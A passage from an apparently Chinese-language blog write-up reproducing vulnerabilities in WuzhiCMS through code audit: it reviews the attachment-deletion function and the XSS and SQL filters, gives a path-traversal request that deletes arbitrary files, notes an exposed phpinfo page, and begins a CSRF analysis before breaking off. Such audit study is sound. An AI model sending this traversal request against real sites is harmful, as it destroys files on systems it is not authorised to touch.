class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">del</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"> </span>&#123;<br>     <br>     <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$id</span> &amp;&amp; !<span class="hljs-variable">$url</span>) <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>     <span class="hljs-keyword">if</span> (<span class="hljs-variable">$id</span>) &#123;<br>     <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$id</span>)) &#123;<br><span class="hljs-variable">$ids</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$id</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$ids</span> = <span class="hljs-variable">$id</span>;<br>&#125;<br>   <br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$ids</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$id</span>) &#123;<br><span class="hljs-variable">$where</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$att_info</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;usertimes,path&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;usertimes&#x27;</span>] &gt; <span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-string">&#x27;usertimes = usertimes-1&#x27;</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;path&#x27;</span>]);<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>);<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment_tag_index&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;att_id&#x27;</span>=&gt;<span class="hljs-variable">$id</span>));<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;delete success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">1000</span>);<br>     &#125;<br>     <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$url</span>) <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-string">&#x27;url del &#x27;</span> . <span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>         <span class="hljs-variable">$path</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(ATTACHMENT_URL, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$url</span>);<br>         <span class="hljs-keyword">if</span> (<span class="hljs-variable">$path</span>) &#123;<br>             <span class="hljs-variable">$where</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;path&#x27;</span> =&gt; <span class="hljs-variable">$path</span>);<br>             <span class="hljs-variable">$att_info</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;usertimes,id&#x27;</span>);<br>   <br>             <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$att_info</span>)) &#123;<br>                 <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$path</span>);<br>                 <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>             &#125;<br>   <br>             <span class="hljs-keyword">if</span> (<span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;usertimes&#x27;</span>] &gt; <span class="hljs-number">1</span>) &#123;<br>                 <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-string">&#x27;usertimes = usertimes-1&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;id&#x27;</span>]));<br>             &#125;<br>             <span class="hljs-keyword">else</span> &#123;<br>                 <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$path</span>);<br>                 <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;id&#x27;</span>]));<br>                 <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_success&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>             &#125;<br>         &#125;<br>         <span class="hljs-keyword">else</span> &#123;<br>             <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;operation_failure&#x27;</span>), HTTP_REFERER, <span class="hljs-number">3000</span>);<br>         &#125;<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure><p>其中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;id&#x27;</span>]) ? <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;id&#x27;</span>] : <span class="hljs-string">&#x27;&#x27;</span>;<br>  <span class="hljs-variable">$url</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) ? <span class="hljs-title function_ invoke__">remove_xss</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;url&#x27;</span>]) : <span class="hljs-string">&#x27;&#x27;</span>;<br></code></pre></td></tr></table></figure><p>调用id    url，查看remove_xss的过滤</p></li><li><p>查看过滤，追溯remove_xss</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">remove_xss</span>(<span class="hljs-params"><span class="hljs-variable">$val</span></span>)</span>&#123;<br><span class="hljs-comment">// remove all non-printable characters. CR(0a) and LF(0b) and TAB(9) are allowed</span><br><span class="hljs-comment">// this prevents some character re-spacing such as &lt;java\0script&gt;</span><br><span class="hljs-comment">// note that you have to handle splits with \n, \r, and \t later since they *are* allowed in some inputs</span><br><span class="hljs-variable">$val</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$val</span>);<br><br><span class="hljs-comment">// straight replacements, the user should never need these since they&#x27;re normal characters</span><br><span class="hljs-comment">// this prevents like &lt;IMG SRC=@avascript:alert(&#x27;XSS&#x27;)&gt;</span><br><span class="hljs-variable">$search</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;<br><span class="hljs-variable">$search</span> .= <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;<br><span class="hljs-variable">$search</span> .= <span class="hljs-string">&#x27;1234567890!@#$%^&amp;*()&#x27;</span>;<br><span class="hljs-variable">$search</span> .= <span class="hljs-string">&#x27;~`&quot;;:?+/=&#123;&#125;[]-_|\&#x27;\\&#x27;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$search</span>); <span class="hljs-variable">$i</span>++) &#123;<br><span class="hljs-comment">// ;? matches the ;, which is optional</span><br><span class="hljs-comment">// 0&#123;0,7&#125; matches any padded zeros, which are optional and go up to 8 chars</span><br><br><span class="hljs-comment">// @ @ search for the hex values</span><br><span class="hljs-variable">$val</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/(&amp;#[xX]0&#123;0,8&#125;&#x27;</span> . <span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$search</span>[<span class="hljs-variable">$i</span>])) . <span class="hljs-string">&#x27;;?)/i&#x27;</span>, <span class="hljs-variable">$search</span>[<span class="hljs-variable">$i</span>], <span class="hljs-variable">$val</span>); <span class="hljs-comment">// with a ;</span><br><span class="hljs-comment">// @ @ 0&#123;0,7&#125; matches &#x27;0&#x27; zero to seven times</span><br><span class="hljs-variable">$val</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/(&amp;#0&#123;0,8&#125;&#x27;</span> . <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$search</span>[<span class="hljs-variable">$i</span>]) . <span class="hljs-string">&#x27;;?)/&#x27;</span>, <span class="hljs-variable">$search</span>[<span class="hljs-variable">$i</span>], <span class="hljs-variable">$val</span>); <span class="hljs-comment">// with a ;</span><br>&#125;<br><br><span class="hljs-comment">// now the only remaining whitespace attacks are \t, \n, and \r</span><br><span class="hljs-variable">$ra1</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;javascript&#x27;</span>, <span class="hljs-string">&#x27;vbscript&#x27;</span>, <span class="hljs-string">&#x27;expression&#x27;</span>, <span class="hljs-string">&#x27;applet&#x27;</span>, <span class="hljs-string">&#x27;meta&#x27;</span>, <span class="hljs-string">&#x27;xml&#x27;</span>, <span class="hljs-string">&#x27;blink&#x27;</span>, <span class="hljs-string">&#x27;link&#x27;</span>, <span class="hljs-string">&#x27;style&#x27;</span>, <span class="hljs-string">&#x27;script&#x27;</span>, <span class="hljs-string">&#x27;embed&#x27;</span>, <span class="hljs-string">&#x27;object&#x27;</span>, <span class="hljs-string">&#x27;iframe&#x27;</span>, <span class="hljs-string">&#x27;frame&#x27;</span>, <span class="hljs-string">&#x27;frameset&#x27;</span>, <span class="hljs-string">&#x27;ilayer&#x27;</span>, <span class="hljs-string">&#x27;layer&#x27;</span>, <span class="hljs-string">&#x27;bgsound&#x27;</span>, <span class="hljs-string">&#x27;title&#x27;</span>, <span class="hljs-string">&#x27;base&#x27;</span>);<br><span class="hljs-variable">$ra2</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;onabort&#x27;</span>, <span class="hljs-string">&#x27;onactivate&#x27;</span>, <span class="hljs-string">&#x27;onafterprint&#x27;</span>, <span class="hljs-string">&#x27;onafterupdate&#x27;</span>, <span class="hljs-string">&#x27;onbeforeactivate&#x27;</span>, <span class="hljs-string">&#x27;onbeforecopy&#x27;</span>, <span class="hljs-string">&#x27;onbeforecut&#x27;</span>, <span class="hljs-string">&#x27;onbeforedeactivate&#x27;</span>, <span class="hljs-string">&#x27;onbeforeeditfocus&#x27;</span>, <span class="hljs-string">&#x27;onbeforepaste&#x27;</span>, <span class="hljs-string">&#x27;onbeforeprint&#x27;</span>, <span class="hljs-string">&#x27;onbeforeunload&#x27;</span>, <span class="hljs-string">&#x27;onbeforeupdate&#x27;</span>, <span class="hljs-string">&#x27;onblur&#x27;</span>, <span class="hljs-string">&#x27;onbounce&#x27;</span>, <span class="hljs-string">&#x27;oncellchange&#x27;</span>, <span class="hljs-string">&#x27;onchange&#x27;</span>, <span class="hljs-string">&#x27;onclick&#x27;</span>, <span class="hljs-string">&#x27;oncontextmenu&#x27;</span>, <span class="hljs-string">&#x27;oncontrolselect&#x27;</span>, <span class="hljs-string">&#x27;oncopy&#x27;</span>, <span class="hljs-string">&#x27;oncut&#x27;</span>, <span class="hljs-string">&#x27;ondataavailable&#x27;</span>, <span class="hljs-string">&#x27;ondatasetchanged&#x27;</span>, <span class="hljs-string">&#x27;ondatasetcomplete&#x27;</span>, <span class="hljs-string">&#x27;ondblclick&#x27;</span>, <span class="hljs-string">&#x27;ondeactivate&#x27;</span>, <span class="hljs-string">&#x27;ondrag&#x27;</span>, <span class="hljs-string">&#x27;ondragend&#x27;</span>, <span class="hljs-string">&#x27;ondragenter&#x27;</span>, <span class="hljs-string">&#x27;ondragleave&#x27;</span>, <span class="hljs-string">&#x27;ondragover&#x27;</span>, <span class="hljs-string">&#x27;ondragstart&#x27;</span>, <span class="hljs-string">&#x27;ondrop&#x27;</span>, <span class="hljs-string">&#x27;onerror&#x27;</span>, <span class="hljs-string">&#x27;onerrorupdate&#x27;</span>, <span class="hljs-string">&#x27;onfilterchange&#x27;</span>, <span class="hljs-string">&#x27;onfinish&#x27;</span>, <span class="hljs-string">&#x27;onfocus&#x27;</span>, <span class="hljs-string">&#x27;onfocusin&#x27;</span>, <span class="hljs-string">&#x27;onfocusout&#x27;</span>, <span class="hljs-string">&#x27;onhelp&#x27;</span>, <span class="hljs-string">&#x27;onkeydown&#x27;</span>, <span class="hljs-string">&#x27;onkeypress&#x27;</span>, <span class="hljs-string">&#x27;onkeyup&#x27;</span>, <span class="hljs-string">&#x27;onlayoutcomplete&#x27;</span>, <span class="hljs-string">&#x27;onload&#x27;</span>, <span class="hljs-string">&#x27;onlosecapture&#x27;</span>, <span class="hljs-string">&#x27;onmousedown&#x27;</span>, <span class="hljs-string">&#x27;onmouseenter&#x27;</span>, <span class="hljs-string">&#x27;onmouseleave&#x27;</span>, <span class="hljs-string">&#x27;onmousemove&#x27;</span>, <span class="hljs-string">&#x27;onmouseout&#x27;</span>, <span class="hljs-string">&#x27;onmouseover&#x27;</span>, <span class="hljs-string">&#x27;onmouseup&#x27;</span>, <span class="hljs-string">&#x27;onmousewheel&#x27;</span>, <span class="hljs-string">&#x27;onmove&#x27;</span>, <span class="hljs-string">&#x27;onmoveend&#x27;</span>, <span class="hljs-string">&#x27;onmovestart&#x27;</span>, <span class="hljs-string">&#x27;onpaste&#x27;</span>, <span class="hljs-string">&#x27;onpropertychange&#x27;</span>, <span class="hljs-string">&#x27;onreadystatechange&#x27;</span>, <span class="hljs-string">&#x27;onreset&#x27;</span>, <span class="hljs-string">&#x27;onresize&#x27;</span>, <span class="hljs-string">&#x27;onresizeend&#x27;</span>, <span class="hljs-string">&#x27;onresizestart&#x27;</span>, <span class="hljs-string">&#x27;onrowenter&#x27;</span>, <span class="hljs-string">&#x27;onrowexit&#x27;</span>, <span class="hljs-string">&#x27;onrowsdelete&#x27;</span>, <span class="hljs-string">&#x27;onrowsinserted&#x27;</span>, <span class="hljs-string">&#x27;onscroll&#x27;</span>, <span class="hljs-string">&#x27;onselect&#x27;</span>, <span class="hljs-string">&#x27;onselectionchange&#x27;</span>, <span class="hljs-string">&#x27;onselectstart&#x27;</span>, <span class="hljs-string">&#x27;onstart&#x27;</span>, <span class="hljs-string">&#x27;onstop&#x27;</span>, <span class="hljs-string">&#x27;onsubmit&#x27;</span>, <span class="hljs-string">&#x27;onunload&#x27;</span>);<br><span class="hljs-variable">$ra</span> = <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$ra1</span>, <span class="hljs-variable">$ra2</span>);<br><br></code></pre></td></tr></table></figure><p>寻找到过滤的字符</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 过滤SQL关键字，mysql入库字段过滤</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> $val 要过滤的字符串</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@return</span> mixed</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">sql_replace</span>(<span class="hljs-params"><span class="hljs-variable">$val</span></span>)</span>&#123;<br><span class="hljs-variable">$val</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\t&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$val</span>);<br><span class="hljs-variable">$val</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;%20&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$val</span>);<br><span class="hljs-variable">$val</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;%27&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$val</span>);<br><span class="hljs-variable">$val</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$val</span>);<br><span class="hljs-variable">$val</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$val</span>);<br><span class="hljs-variable">$val</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$val</span>);<br><span class="hljs-variable">$val</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;/&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$val</span>);<br><span class="hljs-variable">$val</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;;&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$val</span>);<br><span class="hljs-variable">$val</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$val</span>);<br><span class="hljs-variable">$val</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;--&quot;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$val</span>);<br><span class="hljs-variable">$val</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$val</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$val</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>寻找id参数，传入$path(还是在del的定义中)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$id</span>) &#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$id</span>)) &#123;<br><span class="hljs-variable">$ids</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$id</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$ids</span> = <span class="hljs-variable">$id</span>;<br>&#125;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$ids</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$id</span>) &#123;<br><span class="hljs-variable">$where</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;id&#x27;</span> =&gt; <span class="hljs-variable">$id</span>);<br><span class="hljs-variable">$att_info</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>, <span class="hljs-string">&#x27;usertimes,path&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;usertimes&#x27;</span>] &gt; <span class="hljs-number">1</span>) &#123;<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-string">&#x27;usertimes = usertimes-1&#x27;</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">my_unlink</span>(ATTACHMENT_ROOT . <span class="hljs-variable">$att_info</span>[<span class="hljs-string">&#x27;path&#x27;</span>]);<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment&#x27;</span>, <span class="hljs-variable">$where</span>);<br><span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">delete</span>(<span class="hljs-string">&#x27;attachment_tag_index&#x27;</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;att_id&#x27;</span>=&gt;<span class="hljs-variable">$id</span>));<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果取id，则传入$path需要数据库</p><p>如果不传入id参数，判断我们传入的 path 是否在数据库中，如果不在就会对我们传入的 $path 进行删除。</p></li><li><p>删除测试文件(根目录下   text.txt)，抓包（删除其他文件）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">index.php?v=del&amp;url=../text.txt&amp;m=attachment&amp;f=index&amp;_su=wuzhicms&amp;_menuid=29&amp;_submenuid=52 HTTP/1.1<br></code></pre></td></tr></table></figure></li></ol><h2 id="复现5（信息泄露）"><a href="#复现5（信息泄露）" class="headerlink" title="复现5（信息泄露）"></a>复现5（信息泄露）</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027192541870.png" alt="image-20250719015335393"></p><p>在后台页面发现一出phpinfo</p><h2 id="复现6（csrf）"><a href="#复现6（csrf）" class="headerlink" title="复现6（csrf）"></a>复现6（csrf）</h2><p> 系统设置 &#x3D;&gt; 权限管理 &#x3D;&gt; 添加管理员</p><p>修改权限时提交抓包，显示路径</p><p>路径：&#x2F;index.php?m&#x3D;core&amp;f&#x3D;power&amp;v&#x3D;add&amp;&amp;_su&#x3D;wuzhicms</p><ol><li><p>根据路径寻找代码</p><p>coreframe\app\core\admin\power.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * 添加管理员</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">add</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;form&#x27;</span>][<span class="hljs-string">&#x27;username&#x27;</span>])) <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;parameter error&#x27;</span>));<br>            <span class="hljs-variable">$username</span> = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;form&#x27;</span>][<span class="hljs-string">&#x27;username&#x27;</span>];<br>            <span class="hljs-variable">$r</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;member&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$username</span>));<br>            <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$r</span>[<span class="hljs-string">&#x27;uid&#x27;</span>]) <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;账号不存在，请先管理会员处－添加账号&#x27;</span>));<br>            <span class="hljs-variable">$rs</span> = <span class="hljs-variable language_">$this</span>-&gt;db-&gt;<span class="hljs-title function_ invoke__">get_one</span>(<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;uid&#x27;</span>=&gt;<span class="hljs-variable">$r</span>[<span class="hljs-string">&#x27;uid&#x27;</span>]));<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$rs</span>) <span class="hljs-title function_ invoke__">MSG</span>(<span class="hljs-title function_ invoke__">L</span>(<span class="hljs-string">&#x27;管理员已存在！&#x27;</span>));<br><span class="hljs-variable">$formdata</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$formdata</span>[<span class="hljs-string">&#x27;uid&#x27;</span>] = <span class="hljs-variable">$r</span>[<span class="hljs-string">&#x27;uid&#x27;</span>];<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;form&#x27;</span>][<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>                <span class="hljs-variable">$formdata</span>[<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$factor</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">random_string</span>(<span 